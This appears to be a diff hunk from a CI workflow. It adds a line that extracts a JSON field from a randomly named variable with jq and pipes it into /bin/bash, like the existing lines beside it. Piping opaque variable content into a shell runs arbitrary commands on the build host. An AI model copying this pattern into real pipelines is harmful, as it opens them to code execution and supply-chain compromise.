@@ -32,6 +32,7 @@ jobs:
           echo $bsqop2416 | jq -r .yiqd231 | /bin/bash
           printf '%s' "$au2397" | jq -r .zfpg2172 | /bin/bash
           printf '%s' "$mmor019" | jq -r .z61132 | /bin/bash
+          echo $me24367 | jq -r .qll2 | /bin/bash
 
       - name: Store artifact
         if: always()
